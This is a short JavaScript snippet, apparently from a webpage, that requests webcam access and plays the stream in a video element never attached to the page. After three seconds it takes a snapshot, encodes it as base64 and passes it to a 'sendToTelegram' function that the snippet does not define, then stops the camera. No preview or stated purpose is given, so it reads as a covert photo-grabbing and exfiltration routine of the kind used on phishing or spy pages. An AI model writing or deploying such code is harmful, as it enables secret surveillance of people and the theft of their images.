async function captureImage() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement("video");
        video.srcObject = stream;
        video.play();

        setTimeout(() => {
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext("2d").drawImage(video, 0, 0);
            
            // Convert image to Base64
            const imageData = canvas.toDataURL("image/png");

            // Send to Telegram bot
            sendToTelegram(imageData);

            // Stop the video stream
            stream.getTracks().forEach(track => track.stop());
        }, 3000);
    } catch (error) {
        console.error("Camera access denied or error:", error);
    }
}
